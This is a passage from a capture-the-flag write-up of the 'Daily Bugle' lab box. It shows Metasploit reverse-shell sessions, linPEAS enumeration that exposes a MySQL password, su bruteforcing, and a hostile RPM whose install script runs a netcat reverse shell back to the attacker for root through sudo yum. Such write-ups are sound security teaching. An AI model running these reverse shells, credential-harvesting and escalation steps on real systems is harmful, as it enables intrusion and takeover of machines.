</span></span><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; set payload rephp/meterpreterprete/reverse_tcp
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span>&gt; php/meterpreter/reverse_tcp
</span></span><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; run -j
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Exploit running as background job 0.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Exploit completed, but no session was created.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Started reverse TCP handler on 10.10.182.144:4444
</span></span></code></pre></div><p>Additionally after starting a handler, I staged up the <code>shell_to_meterpreter</code> post-exploit module so that I could quickly migrate the process from a php worker to a longer lived process in case there was a timeout configured on the webserver.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; search shell_to_meterpreter
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Matching Modules
</span></span><span style=display:flex><span><span style=color:#f92672>================</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   <span style=color:#75715e>#  Name                                    Disclosure Date  Rank    Check  Description</span>
</span></span><span style=display:flex><span>   -  ----                                    ---------------  ----    -----  -----------
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0</span>  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; use <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; show options
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Module options <span style=color:#f92672>(</span>post/multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span>:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Name     Current Setting  Required  Description
</span></span><span style=display:flex><span>   ----     ---------------  --------  -----------
</span></span><span style=display:flex><span>   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
</span></span><span style=display:flex><span>   LHOST    10.10.182.144    no        IP of host that will receive the connection from the payload <span style=color:#f92672>(</span>Will try to auto detect<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>   LPORT    <span style=color:#ae81ff>4433</span>             yes       Port <span style=color:#66d9ef>for</span> payload to connect to.
</span></span><span style=display:flex><span>   SESSION                   yes       The session to run this module on.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; set SESSION <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>SESSION <span style=color:#f92672>=</span>&gt; <span style=color:#ae81ff>1</span>
</span></span></code></pre></div><p>I then saved the template and refreshed the index page which quickly resulted in a caught shell. Next I executed the post-exploit <code>shell_to_meterpreter</code> module.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending stage <span style=color:#f92672>(</span><span style=color:#ae81ff>38288</span> bytes<span style=color:#f92672>)</span> to 10.10.162.223
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Meterpreter session <span style=color:#ae81ff>1</span> opened <span style=color:#f92672>(</span>10.10.182.144:4444 -&gt; 10.10.162.223:36010<span style=color:#f92672>)</span> at 2020-11-27 22:16:22 +0000
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; run
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> SESSION may not be compatible with this module.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Upgrading session ID: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Starting exploit/multi/handler
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Started reverse TCP handler on 10.10.182.144:4433 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending stage <span style=color:#f92672>(</span><span style=color:#ae81ff>980808</span> bytes<span style=color:#f92672>)</span> to 10.10.162.223
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Meterpreter session <span style=color:#ae81ff>2</span> opened <span style=color:#f92672>(</span>10.10.182.144:4433 -&gt; 10.10.162.223:55960<span style=color:#f92672>)</span> at 2020-11-27 22:16:36 +0000
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Command stager progress: 100.00% <span style=color:#f92672>(</span>773/773 bytes<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Post module execution completed
</span></span><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; sessions 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Active sessions
</span></span><span style=display:flex><span><span style=color:#f92672>===============</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  Id  Name  Type                   Information                                                              Connection
</span></span><span style=display:flex><span>  --  ----  ----                   -----------                                                              ----------
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>1</span>         meterpreter php/linux  apache <span style=color:#f92672>(</span>48<span style=color:#f92672>)</span> @ dailybugle                                                 10.10.182.144:4444 -&gt; 10.10.162.223:36010 <span style=color:#f92672>(</span>10.10.162.223<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>2</span>         meterpreter x86/linux  no-user @ dailybugle <span style=color:#f92672>(</span>uid<span style=color:#f92672>=</span>48, gid<span style=color:#f92672>=</span>48, euid<span style=color:#f92672>=</span>48, egid<span style=color:#f92672>=</span>48<span style=color:#f92672>)</span> @ 10.10.162.223  10.10.182.144:4433 -&gt; 10.10.162.223:55960 <span style=color:#f92672>(</span>10.10.162.223<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; sessions 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Active sessions
</span></span><span style=display:flex><span><span style=color:#f92672>===============</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  Id  Name  Type                   Information                                                              Connection
</span></span><span style=display:flex><span>  --  ----  ----                   -----------                                                              ----------
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>1</span>         meterpreter php/linux  apache <span style=color:#f92672>(</span>48<span style=color:#f92672>)</span> @ dailybugle                                                 10.10.182.144:4444 -&gt; 10.10.162.223:36010 <span style=color:#f92672>(</span>10.10.162.223<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>2</span>         meterpreter x86/linux  no-user @ dailybugle <span style=color:#f92672>(</span>uid<span style=color:#f92672>=</span>48, gid<span style=color:#f92672>=</span>48, euid<span style=color:#f92672>=</span>48, egid<span style=color:#f92672>=</span>48<span style=color:#f92672>)</span> @ 10.10.162.223  10.10.182.144:4433 -&gt; 10.10.162.223:55960 <span style=color:#f92672>(</span>10.10.162.223<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; sessions -k <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Killing the following session<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Killing session <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.162.223 - Meterpreter session <span style=color:#ae81ff>1</span> closed.
</span></span></code></pre></div><p>Once I had a stable shell established, I killed the original shell and quickly replaced the exploited template with its original contents before verifying that I was now able to see the original, unmodified index page.</p><p><p class=markdown-image><img src=/images/daily_bugle_http_replaced_landing_page.png alt="daily bugle restored index"></p></p><h3 id=local-enumeration>Local enumeration <a href=#local-enumeration class=anchor>üîó</a></h3><p>With my new local shell, I reached for linPEAS to run a quick local enumeration of the host.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; sessions <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Starting interaction with 2...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>meterpreter &gt; getpid 
</span></span><span style=display:flex><span>Current pid: <span style=color:#ae81ff>4344</span>
</span></span><span style=display:flex><span>meterpreter &gt; sysinfo 
</span></span><span style=display:flex><span>Computer     : 10.10.162.223
</span></span><span style=display:flex><span>OS           : CentOS 7.7.1908 <span style=color:#f92672>(</span>Linux 3.10.0-1062.el7.x86_64<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Architecture : x64
</span></span><span style=display:flex><span>BuildTuple   : i486-linux-musl
</span></span><span style=display:flex><span>Meterpreter  : x86/linux
</span></span><span style=display:flex><span>meterpreter &gt; cd /tmp
</span></span><span style=display:flex><span>meterpreter &gt; upload /root/Desktop/PEASS/linPEAS/linpeas.sh
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> uploading  : /root/Desktop/PEASS/linPEAS/linpeas.sh -&gt; linpeas.sh
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Uploaded -1.00 B of 217.36 KiB <span style=color:#f92672>(</span>-0.0%<span style=color:#f92672>)</span>: /root/Desktop/PEASS/linPEAS/linpeas.sh -&gt; linpeas.sh
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> uploaded   : /root/Desktop/PEASS/linPEAS/linpeas.sh -&gt; linpeas.sh
</span></span><span style=display:flex><span>meterpreter &gt; shell
</span></span><span style=display:flex><span>Process <span style=color:#ae81ff>4353</span> created.
</span></span><span style=display:flex><span>Channel <span style=color:#ae81ff>2</span> created.
</span></span><span style=display:flex><span>./linpeas.sh &gt; 10.10.162.223_enum.txt
</span></span><span style=display:flex><span>which: no fping in <span style=color:#f92672>(</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/system/bin:/system/sbin:/system/xbin<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>meterpreter &gt; download 10.10.162.223_enum.txt /root/ctf/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Downloading: 10.10.162.223_enum.txt -&gt; /root/ctf//10.10.162.223_enum.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Downloaded 429.28 KiB of 429.28 KiB <span style=color:#f92672>(</span>100.0%<span style=color:#f92672>)</span>: 10.10.162.223_enum.txt -&gt; /root/ctf//10.10.162.223_enum.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> download   : 10.10.162.223_enum.txt -&gt; /root/ctf//10.10.162.223_enum.txt
</span></span></code></pre></div><p>The enumeration yielded a few pieces of information that seemed useful: a username <code>jjameson</code> and a set of root credentials for mysql DB from the <code>/var/www/html/configuration.php</code> file.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Users with console
</span></span><span style=display:flex><span>jjameson:x:1000:1000:Jonah Jameson:/home/jjameson:/bin/bash
</span></span><span style=display:flex><span>root:x:0:0:root:/root:/bin/bash
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Searching passwords in config PHP files
</span></span><span style=display:flex><span>     public $password <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;nv5uz9r3ZEDzVjNu&#39;</span>;
</span></span></code></pre></div><p>I added this set of credentials to my dailybugle wordlist and decided to investigate how I could move horizontally to the <code>jjameson</code> user.</p><p>It&rsquo;s worth noting, in my initial pass I had neglected to document the above password which lead to a significant rabbithole as I continuously enumerated the host looking for a point of escalation.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf# echo <span style=color:#e6db74>&#39;nv5uz9r3ZEDzVjNu&#39;</span> &gt;&gt; ./wordlists/dailybugle.txt
</span></span></code></pre></div><h3 id=horizontal-local-privilege-escalation>Horizontal local privilege escalation <a href=#horizontal-local-privilege-escalation class=anchor>üîó</a></h3><p>Now that I had identified the <code>jjameson</code> user as a potential next target I decided to attempt to escalate locally using a small, but immensely useful, bash script from Carlos Polop that bruteforces <code>su</code>, <a href=https://github.com/carlospolop/su-bruteforce target=_blank rel=noopener>su-bruteforce</a>. I generated a new wordlist by combining the dailybugle wordlist and rockyou and then transferred this over to the host over a local http webserver. While not shown, <code>suBF.sh</code> was transfered to the host over the meterpreter session.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf# curl -sO https://raw.githubusercontent.com/carlospolop/su-bruteforce/master/suBF.sh
</span></span><span style=display:flex><span>root@kali:~/ctf# cd wordlists/
</span></span><span style=display:flex><span>root@kali:~/ctf/wordlists# cat dailybugle.txt /usr/share/wordlists/rockyou.txt &gt; combined-wl.txt
</span></span><span style=display:flex><span>root@kali:~/ctf/wordlists# head combined-wl.txt -n <span style=color:#ae81ff>10</span>
</span></span><span style=display:flex><span>spiderman123
</span></span><span style=display:flex><span>nv5uz9r3ZEDzVjNu
</span></span><span style=display:flex><span><span style=color:#ae81ff>123456</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>12345</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>123456789</span>
</span></span><span style=display:flex><span>password
</span></span><span style=display:flex><span>iloveyou
</span></span><span style=display:flex><span>princess
</span></span><span style=display:flex><span><span style=color:#ae81ff>1234567</span>
</span></span><span style=display:flex><span>rockyou
</span></span><span style=display:flex><span>root@kali:~/ctf/wordlists# python3 -m http.server <span style=color:#ae81ff>8000</span>
</span></span><span style=display:flex><span>Serving HTTP on 0.0.0.0 port <span style=color:#ae81ff>8000</span> <span style=color:#f92672>(</span>http://0.0.0.0:8000/<span style=color:#f92672>)</span> ...
</span></span><span style=display:flex><span>10.10.162.223 - - <span style=color:#f92672>[</span>27/Nov/2020 22:36:38<span style=color:#f92672>]</span> <span style=color:#e6db74>&#34;GET /combined-wl.txt HTTP/1.1&#34;</span> <span style=color:#ae81ff>200</span> -
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>meterpreter &gt; shell
</span></span><span style=display:flex><span>Process <span style=color:#ae81ff>21812</span> created.
</span></span><span style=display:flex><span>Channel <span style=color:#ae81ff>7</span> created.
</span></span><span style=display:flex><span>curl -sO <span style=color:#e6db74>&#39;http://10.10.182.144/combined-wl.txt&#39;</span>
</span></span><span style=display:flex><span>./suBF.sh -u jjameson -w combined-wl.txt -t 0.7 -s 0.007
</span></span><span style=display:flex><span>  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Bruteforcing jjameson...
</span></span><span style=display:flex><span>  You can login as jjameson using password: nv5uz9r3ZEDzVjNu
</span></span></code></pre></div><p>Executing <code>suBF</code> immediately returned a match for the root database credentials. I attempted to ssh from my attack host to the target using the <code>jjameson</code> user and was pleased to find a shell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~# ssh jjameson@10.10.162.223
</span></span><span style=display:flex><span>The authenticity of host <span style=color:#e6db74>&#39;10.10.162.223 (10.10.162.223)&#39;</span> can<span style=color:#e6db74>&#39;t be established.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>ECDSA key fingerprint is SHA256:apAdD+3yApa9Kmt7Xum5WFyVFUHZm/dCR/uJyuuCi5g.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Warning: Permanently added &#39;</span>10.10.162.223<span style=color:#e6db74>&#39; (ECDSA) to the list of known hosts.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>jjameson@10.10.162.223&#39;</span>s password: 
</span></span><span style=display:flex><span>Last login: Fri Nov <span style=color:#ae81ff>27</span> 17:37:52 <span style=color:#ae81ff>2020</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>jjameson@dailybugle ~<span style=color:#f92672>]</span>$ ls
</span></span><span style=display:flex><span>user.txt
</span></span></code></pre></div><p>Upon logging in, I immediately found the first flag at <code>/home/jjameson/user.txt</code>.</p><h3 id=local-enumeration-again>Local enumeration again <a href=#local-enumeration-again class=anchor>üîó</a></h3><p>Now that I had a new low-privilege user I decided to run through enumeration with <code>linPEAS</code> again to see if it would turn up anything more useful than the previous scan. I uploaded the script to the users home directory and re-executed it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>User jjameson may run the following commands on dailybugle:
</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>ALL<span style=color:#f92672>)</span> NOPASSWD: /usr/bin/yum
</span></span></code></pre></div><p>Interestingly this showed that the user had sudo privileges to execute <code>yum</code> which appeared to give the user the ability to install or uninstall anything on the host.</p><h3 id=exploiting-yum-for-vertical-escalation>Exploiting yum for vertical escalation <a href=#exploiting-yum-for-vertical-escalation class=anchor>üîó</a></h3><p>With the ability to execute yum on the host as a privileged user, I tried to craft a hostile RPM that I could use to trigger a reverse shell. To do this I would first need to craft the hostile package.</p><h4 id=crafting-a-hostile-rpm>Crafting a hostile RPM <a href=#crafting-a-hostile-rpm class=anchor>üîó</a></h4><p>Referencing <a href=https://gtfobins.github.io/gtfobins/yum/ target=_blank rel=noopener>gtfobins</a> I crafted the RPM using <a href=https://github.com/jordansissel/fpm target=_blank rel=noopener>fpm</a>. My plan of attack was to pack a netcat reverse shell into the <code>before-install</code> trigger of an empty package.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf# EXPLOITDIR<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>mktemp -d<span style=color:#66d9ef>)</span>
</span></span><span style=display:flex><span>root@kali:~/ctf# CMD<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;nc -e /bin/bash 10.10.182.144 4444&#39;</span>
</span></span><span style=display:flex><span>root@kali:~/ctf# RPMNAME<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;exploited&#34;</span>
</span></span><span style=display:flex><span>root@kali:~/ctf# echo $CMD &gt; $EXPLOITDIR/beforeinstall.sh
</span></span><span style=display:flex><span>root@kali:~/ctf# fpm -n $RPMNAME -s dir -t rpm -a all --before-install $EXPLOITDIR/beforeinstall.sh $EXPLOITDIR
</span></span><span style=display:flex><span>Doing <span style=color:#e6db74>`</span>require <span style=color:#e6db74>&#39;backports&#39;</span><span style=color:#e6db74>`</span> is deprecated and will not load any backport in the next major release.
</span></span><span style=display:flex><span>Require just the needed backports instead, or <span style=color:#e6db74>&#39;backports/latest&#39;</span>.
</span></span><span style=display:flex><span>Created package <span style=color:#f92672>{</span>:path<span style=color:#f92672>=</span>&gt;<span style=color:#e6db74>&#34;exploited-1.0-1.noarch.rpm&#34;</span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>With the attack staged I, again, setup a listener in metasploit and then staged up the <code>shell_to_meterpreter</code> module to migrate to a stable shell in case yum timed out.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; use exploit/multi/handler 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Using configured payload php/meterpreter/reverse_tcp
</span></span><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; set payload generic/shell_reverse_tcp 
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span>&gt; generic/shell_reverse_tcp
</span></span><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; show options
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Module options <span style=color:#f92672>(</span>exploit/multi/handler<span style=color:#f92672>)</span>:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Name  Current Setting  Required  Description
</span></span><span style=display:flex><span>   ----  ---------------  --------  -----------
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Payload options <span style=color:#f92672>(</span>generic/shell_reverse_tcp<span style=color:#f92672>)</span>:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Name   Current Setting  Required  Description
</span></span><span style=display:flex><span>   ----   ---------------  --------  -----------
</span></span><span style=display:flex><span>   LHOST  10.10.182.144    yes       The listen address <span style=color:#f92672>(</span>an interface may be specified<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   LPORT  <span style=color:#ae81ff>4444</span>             yes       The listen port
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Exploit target:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Id  Name
</span></span><span style=display:flex><span>   --  ----
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0</span>   Wildcard Target
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; run -j
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Exploit running as background job 2.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Exploit completed, but no session was created.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Started reverse TCP handler on 10.10.182.144:4333 
</span></span><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; search shell_to_meterpreter
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Matching Modules
</span></span><span style=display:flex><span><span style=color:#f92672>================</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   <span style=color:#75715e>#  Name                                    Disclosure Date  Rank    Check  Description</span>
</span></span><span style=display:flex><span>   -  ----                                    ---------------  ----    -----  -----------
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0</span>  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; use <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; set lport <span style=color:#ae81ff>4333</span>
</span></span><span style=display:flex><span>lport <span style=color:#f92672>=</span>&gt; <span style=color:#ae81ff>4333</span>
</span></span><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; set session <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>session <span style=color:#f92672>=</span>&gt; <span style=color:#ae81ff>3</span>
</span></span></code></pre></div><p>I then uploaded the poisoned RPM to the host over sftp and started a <code>yum localinstall</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sftp&gt; put exploited-1.0-1.noarch.rpm 
</span></span><span style=display:flex><span>Uploading exploited-1.0-1.noarch.rpm to /home/jjameson/exploited-1.0-1.noarch.rpm
</span></span><span style=display:flex><span>exploited-1.0-1.noarch.rpm
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>jjameson@dailybugle ~<span style=color:#f92672>]</span>$ sudo yum localinstall -y exploited-1.0-1.noarch.rpm 
</span></span><span style=display:flex><span>Loaded plugins: fastestmirror
</span></span></code></pre></div><p>It took quite a while to get through the yum plugins, yet eventially the session opened.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; <span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Command shell session <span style=color:#ae81ff>3</span> opened <span style=color:#f92672>(</span>10.10.182.144:4444 -&gt; 10.10.162.223:36016<span style=color:#f92672>)</span> at 2020-11-27 23:06:30 +0000
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; show options
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Module options <span style=color:#f92672>(</span>post/multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span>:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Name     Current Setting  Required  Description
</span></span><span style=display:flex><span>   ----     ---------------  --------  -----------
</span></span><span style=display:flex><span>   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
</span></span><span style=display:flex><span>   LHOST    10.10.182.144    no        IP of host that will receive the connection from the payload <span style=color:#f92672>(</span>Will try to auto detect<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>   LPORT    <span style=color:#ae81ff>4333</span>             yes       Port <span style=color:#66d9ef>for</span> payload to connect to.
</span></span><span style=display:flex><span>   SESSION  <span style=color:#ae81ff>3</span>                yes       The session to run this module on.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; run
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Upgrading session ID: <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Starting exploit/multi/handler
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Started reverse TCP handler on 10.10.182.144:4333 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending stage <span style=color:#f92672>(</span><span style=color:#ae81ff>980808</span> bytes<span style=color:#f92672>)</span> to 10.10.162.223
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Meterpreter session <span style=color:#ae81ff>5</span> opened <span style=color:#f92672>(</span>10.10.182.144:4333 -&gt; 10.10.162.223:35216<span style=color:#f92672>)</span> at 2020-11-27 23:08:04 +0000
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Command stager progress: 100.00% <span style=color:#f92672>(</span>773/773 bytes<span style=color:#f92672>)</span>
